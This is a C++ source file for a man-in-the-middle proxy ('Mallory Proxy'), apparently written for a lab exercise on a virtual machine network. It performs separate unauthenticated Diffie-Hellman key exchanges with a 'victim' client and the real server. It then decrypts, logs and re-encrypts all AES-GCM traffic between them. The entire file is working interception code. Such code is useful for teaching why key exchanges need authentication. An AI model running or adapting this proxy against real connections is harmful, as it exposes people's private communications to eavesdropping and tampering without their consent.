#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <openssl/bn.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <algorithm> // For std::max

// ---------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------
constexpr int SERVER_PORT = 8080;             // Real Server Port
constexpr const char* SERVER_IP = "10.0.2.10"; // Real Server IP (Ubuntu VM)

constexpr int PROXY_PORT = 9090;             // Proxy Listening Port
constexpr int BUFFER_SIZE = 4096;            // Buffer size

// RFC 3526 Group 15 (3072-bit MODP Group)
const char* MODP_3072_PRIME =
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
    "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
    "15728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64"
    "ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7"
    "ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6B"
    "F12FFA06D98A0864D87602733EC86A64521F2B18177B200C"
    "BBE117577A615D6C770988C0BAD946E208E24FA074E5AB31"
    "43DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF";

// ---------------------------------------------------------------------
// Helper: Send all bytes of a string safely
// ---------------------------------------------------------------------
bool send_all(int sock, const std::string& data) {
    size_t total_sent = 0;
    while (total_sent < data.size()) {
        ssize_t n = send(sock, data.data() + total_sent, data.size() - total_sent, 0);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            return false;
        }
        total_sent += (size_t)n;
    }
    return true;
}

// ---------------------------------------------------------------------
// Helper: Base64 Encoding/Decoding
// ---------------------------------------------------------------------
std::string b64_encode(const std::string& in) {
    std::string out(4 * ((in.size() + 2) / 3), '\0');
    int len = EVP_EncodeBlock((unsigned char*)out.data(), (const unsigned char*)in.data(), in.size());
    out.resize(len);
    return out;
}

std::string b64_decode(const std::string& in) {
    int pad = 0;
    if (in.length() > 0 && in[in.length() - 1] == '=') pad++;
    if (in.length() > 1 && in[in.length() - 2] == '=') pad++;
    std::string out(3 * in.length() / 4, '\0');
    int len = EVP_DecodeBlock((unsigned char*)out.data(), (const unsigned char*)in.data(), in.length());
    out.resize(len - pad);
    return out;
}

// ---------------------------------------------------------------------
// Helper: AES-256-GCM Encryption / Decryption
// ---------------------------------------------------------------------
std::string aes_encrypt(const std::string& plaintext, const unsigned char* key) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[12];
    RAND_bytes(iv, sizeof(iv));

    std::string ciphertext;
    ciphertext.resize(plaintext.size() + EVP_MAX_BLOCK_LENGTH);
    int len = 0, ciphertext_len = 0;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, (unsigned char*)&ciphertext[0], &len, (unsigned char*)plaintext.c_str(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, (unsigned char*)&ciphertext[0] + len, &len);
    ciphertext_len += len;
    ciphertext.resize(ciphertext_len);

    unsigned char tag[16];
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
    EVP_CIPHER_CTX_free(ctx);

    std::string bin_result = "";
    bin_result.append((char*)iv, 12);
    bin_result.append((char*)tag, 16);
    bin_result.append(ciphertext);
    return b64_encode(bin_result);
}

bool aes_decrypt(const std::string& b64_input, const unsigned char* key, std::string& decrypted_out) {
    std::string input = b64_decode(b64_input);
    if (input.size() < 28) return false;

    const unsigned char* iv = (const unsigned char*)input.data();
    const unsigned char* tag = (const unsigned char*)input.data() + 12;
    const unsigned char* ciphertext = (const unsigned char*)input.data() + 28;
    int ciphertext_len = input.size() - 28;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);

    std::string plaintext;
    plaintext.resize(ciphertext_len);
    int len = 0, plaintext_len = 0;

    EVP_DecryptUpdate(ctx, (unsigned char*)&plaintext[0], &len, ciphertext, ciphertext_len);
    plaintext_len = len;
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void*)tag);

    int ret = EVP_DecryptFinal_ex(ctx, (unsigned char*)&plaintext[0] + len, &len);
    EVP_CIPHER_CTX_free(ctx);

    if (ret > 0) {
        plaintext_len += len;
        plaintext.resize(plaintext_len);
        decrypted_out = plaintext;
        return true;
    }
    return false;
}

int main() {
    std::cout << "[Mallory Proxy] Starting Phase 2 MITM Proxy on port " << PROXY_PORT << "...\n";

    // 1. Setup listening socket for the victim client
    int proxy_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(PROXY_PORT);
    proxy_addr.sin_addr.s_addr = INADDR_ANY;

    int opt = 1;
    setsockopt(proxy_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    if (bind(proxy_sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
        std::cerr << "[Proxy] Bind failed.\n";
        return -1;
    }
    listen(proxy_sock, 5);

    // 2. Connect to the Real Server
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr);

    if (connect(server_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        std::cerr << "[Proxy] Connection to Real Server failed.\n";
        return -1;
    }
    std::cout << "[Proxy] Connected to Real Server at " << SERVER_IP << ":" << SERVER_PORT << "\n";

    // 3. Accept incoming connection from the victim Client
    struct sockaddr_in cli_addr;
    socklen_t cli_len = sizeof(cli_addr);
    int victim_sock = accept(proxy_sock, (struct sockaddr*)&cli_addr, &cli_len);
    std::cout << "[Proxy] Victim Client connected from " << inet_ntoa(cli_addr.sin_addr) << "\n";

    // Initialize BIGNUM context for Phase 2 DH
    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* p = NULL; BIGNUM* g = NULL;
    BN_hex2bn(&p, MODP_3072_PRIME);
    BN_hex2bn(&g, "2");

    // --- DH EXCH 1: Proxy <-> Real Server (Proxy acts as client) ---
    std::cout << "[Proxy] Performing independent DH exchange with Real Server...\n";
    BIGNUM* priv_proxy_server = BN_new();
    BIGNUM* pub_proxy_server = BN_new();
    BN_rand_range(priv_proxy_server, p);
    BN_mod_exp(pub_proxy_server, g, priv_proxy_server, p, ctx);

    char* pub_proxy_server_hex = BN_bn2hex(pub_proxy_server);
    send_all(server_sock, std::string(pub_proxy_server_hex) + "\n");
    OPENSSL_free(pub_proxy_server_hex);

    // Read Server's public value
    std::string server_pub_hex = "";
    char c;
    while (read(server_sock, &c, 1) > 0) {
        if (c == '\n') break;
        server_pub_hex += c;
    }

    BIGNUM* server_pub = NULL;
    BIGNUM* secret_server = BN_new();
    BN_hex2bn(&server_pub, server_pub_hex.c_str());
    BN_mod_exp(secret_server, server_pub, priv_proxy_server, p, ctx);

    unsigned char server_aes_key[32];
    int s_bytes_len = BN_num_bytes(secret_server);
    unsigned char* s_bytes_s = new unsigned char[s_bytes_len];
    BN_bn2bin(secret_server, s_bytes_s);
    SHA256(s_bytes_s, s_bytes_len, server_aes_key);
    delete[] s_bytes_s;

    // --- DH EXCH 2: Victim Client <-> Proxy (Proxy acts as server) ---
    std::cout << "[Proxy] Performing independent DH exchange with Victim Client...\n";
    
    // Read Client's public value first
    std::string client_pub_hex = "";
    while (read(victim_sock, &c, 1) > 0) {
        if (c == '\n') break;
        client_pub_hex += c;
    }

    BIGNUM* priv_proxy_client = BN_new();
    BIGNUM* pub_proxy_client = BN_new();
    BN_rand_range(priv_proxy_client, p);
    BN_mod_exp(pub_proxy_client, g, priv_proxy_client, p, ctx);

    char* pub_proxy_client_hex = BN_bn2hex(pub_proxy_client);
    send_all(victim_sock, std::string(pub_proxy_client_hex) + "\n");
    OPENSSL_free(pub_proxy_client_hex);

    BIGNUM* client_pub = NULL;
    BIGNUM* secret_client = BN_new();
    BN_hex2bn(&client_pub, client_pub_hex.c_str());
    BN_mod_exp(secret_client, client_pub, priv_proxy_client, p, ctx);

    unsigned char client_aes_key[32];
    int c_bytes_len = BN_num_bytes(secret_client);
    unsigned char* s_bytes_c = new unsigned char[c_bytes_len];
    BN_bn2bin(secret_client, s_bytes_c);
    SHA256(s_bytes_c, c_bytes_len, client_aes_key);
    delete[] s_bytes_c;

    // Cleanup BIGNUM contexts
    BN_free(p); BN_free(g); 
    BN_free(priv_proxy_server); BN_free(pub_proxy_server); BN_free(server_pub); BN_free(secret_server);
    BN_free(priv_proxy_client); BN_free(pub_proxy_client); BN_free(client_pub); BN_free(secret_client);
    BN_CTX_free(ctx);

    std::cout << "[Proxy] MITM Handshakes Complete! Intercepting and logging traffic...\n";

    // 4. Relay & Intercept Loop
    fd_set readfds;
    char buffer[BUFFER_SIZE];
    std::string client_rx_buf = "";
    std::string server_rx_buf = "";

    while (true) {
        FD_ZERO(&readfds);
        FD_SET(victim_sock, &readfds);
        FD_SET(server_sock, &readfds);

        int max_sock = std::max(victim_sock, server_sock);
        if (select(max_sock + 1, &readfds, NULL, NULL, NULL) < 0) {
            perror("Select failed");
            break;
        }

        // Case A: Packet from Client -> Decrypt with Client Key -> Log Plaintext -> Encrypt with Server Key -> Forward to Server
        if (FD_ISSET(victim_sock, &readfds)) {
            int n = read(victim_sock, buffer, BUFFER_SIZE - 1);
            if (n <= 0) {
                std::cout << "[Proxy] Client disconnected.\n";
                break;
            }
            client_rx_buf.append(buffer, n);
            size_t pos;
            while ((pos = client_rx_buf.find('\n')) != std::string::npos) {
                std::string frame = client_rx_buf.substr(0, pos);
                client_rx_buf.erase(0, pos + 1);

                std::string plaintext;
                if (aes_decrypt(frame, client_aes_key, plaintext)) {
                    std::cout << "\n[MALLORY LOG - INTERCEPTED FROM CLIENT] " << plaintext << "\n";
                    
                    // Re-encrypt and send to the real server
                    std::string fwd = aes_encrypt(plaintext, server_aes_key) + "\n";
                    send_all(server_sock, fwd);
                } else {
                    std::cout << "[Proxy] Failed to decrypt message from client.\n";
                }
            }
        }

        // Case B: Packet from Server -> Decrypt with Server Key -> Log Plaintext -> Encrypt with Client Key -> Forward to Client
        if (FD_ISSET(server_sock, &readfds)) {
            int n = read(server_sock, buffer, BUFFER_SIZE - 1);
            if (n <= 0) {
                std::cout << "[Proxy] Server disconnected.\n";
                break;
            }
            server_rx_buf.append(buffer, n);
            size_t pos;
            while ((pos = server_rx_buf.find('\n')) != std::string::npos) {
                std::string frame = server_rx_buf.substr(0, pos);
                server_rx_buf.erase(0, pos + 1);

                std::string plaintext;
                if (aes_decrypt(frame, server_aes_key, plaintext)) {
                    std::cout << "\n[MALLORY LOG - INTERCEPTED FROM SERVER] " << plaintext << "\n";
                    
                    // Re-encrypt and send to the victim client
                    std::string fwd = aes_encrypt(plaintext, client_aes_key) + "\n";
                    send_all(victim_sock, fwd);
                } else {
                    std::cout << "[Proxy] Failed to decrypt message from server.\n";
                }
            }
        }
    }

    close(victim_sock);
    close(server_sock);
    close(proxy_sock);
    return 0;
}
